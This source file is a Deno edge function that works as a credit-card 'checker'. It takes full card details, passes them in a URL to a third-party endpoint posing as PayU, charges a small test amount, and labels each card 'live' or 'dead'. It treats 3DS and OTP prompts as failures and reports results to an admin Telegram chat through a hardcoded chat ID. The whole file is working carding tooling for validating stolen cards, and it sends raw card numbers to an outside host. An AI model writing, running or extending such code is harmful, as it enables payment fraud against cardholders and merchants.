import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

async function sendAdminTelegram(message: string) {
  const botToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
  const adminChatId = Deno.env.get('ADMIN_TELEGRAM_CHAT_ID') || '8496943061';
  
  if (!botToken) {
    console.log('No Telegram bot token configured');
    return;
  }

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: adminChatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });
  } catch (error) {
    console.error('Failed to send admin Telegram:', error);
  }
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { cc, amount } = await req.json();

    if (!cc) {
      return new Response(
        JSON.stringify({ error: "Card details (cc) required" }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Default amount to 1 if not provided
    const chargeAmount = amount || 1;
    const maskedCC = cc.substring(0, 6) + '****' + cc.slice(-4);

    console.log(`PayU Check - Amount: ₹${chargeAmount}, Card: ${maskedCC}`);

    // Call the PayU API
    const apiUrl = `https://payu.up.railway.app/${chargeAmount}/${cc}`;
    
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
    });

    const responseText = await response.text();
    console.log(`PayU Response: ${responseText}`);

    let data;
    try {
      data = JSON.parse(responseText);
    } catch {
      data = { raw: responseText };
    }

    // Determine status from response
    let status: "live" | "dead" | "unknown" = "unknown";
    let apiMessage = responseText;

    const lowerResponse = responseText.toLowerCase();
    
    // Check for failure indicators FIRST (they can appear alongside "success" in the wrapper)
    const hasFailureIndicators = 
        lowerResponse.includes("3d") || 
        lowerResponse.includes("3ds") ||
        lowerResponse.includes("verification") ||
        lowerResponse.includes("verify") ||
        lowerResponse.includes("authenticate") ||
        lowerResponse.includes("otp") ||
        lowerResponse.includes("secure") ||
        lowerResponse.includes("redirect") ||
        lowerResponse.includes("declined") || 
        lowerResponse.includes("could not") ||
        lowerResponse.includes("transaction failed") ||
        lowerResponse.includes("invalid") ||
        lowerResponse.includes("insufficient") ||
        lowerResponse.includes("expired") ||
        lowerResponse.includes("rejected") ||
        lowerResponse.includes("failed\":true") ||
        lowerResponse.includes("error_code") ||
        lowerResponse.includes("try again");

    if (hasFailureIndicators) {
      status = "dead";
      // Extract error message if available
      if (data && typeof data === 'object' && data.transaction?.retryOptions?.details?.error_message) {
        apiMessage = data.transaction.retryOptions.details.error_message;
      } else if (data && typeof data === 'object' && data.transaction?.retryOptions?.details?.error_title) {
        apiMessage = data.transaction.retryOptions.details.error_title;
      }
    } else if (lowerResponse.includes("success") || 
        lowerResponse.includes("approved") || 
        lowerResponse.includes("charged") ||
        lowerResponse.includes("payment successful") ||
        lowerResponse.includes("transaction successful")) {
      status = "live";
    }

    // Try to extract message from JSON response
    if (data && typeof data === 'object') {
      if (data.message) apiMessage = data.message;
      else if (data.status) apiMessage = data.status;
      else if (data.result) apiMessage = data.result;
      else if (data.error) apiMessage = data.error;
    }

    // Send raw response to admin via Telegram
    const prettyJson = JSON.stringify(data, null, 2);
    const adminMessage = `🔍 <b>PayU API Raw Response</b>

💳 <b>Card:</b> <code>${maskedCC}</code>
💰 <b>Amount:</b> ₹${chargeAmount}
📊 <b>Status:</b> ${status.toUpperCase()}

📦 <b>Raw Response:</b>
<pre>${prettyJson.substring(0, 3500)}</pre>`;

    await sendAdminTelegram(adminMessage);

    return new Response(
      JSON.stringify({
        status,
        apiStatus: status.toUpperCase(),
        apiMessage,
        rawResponse: responseText,
        amount: chargeAmount
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : "Failed to process request";
    console.error('PayU Check Error:', errorMessage);
    
    // Send error to admin
    await sendAdminTelegram(`❌ <b>PayU API Error</b>\n\n<code>${errorMessage}</code>`);
    
    return new Response(
      JSON.stringify({
        status: "unknown",
        apiStatus: "ERROR",
        apiMessage: errorMessage,
        rawResponse: errorMessage
      }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
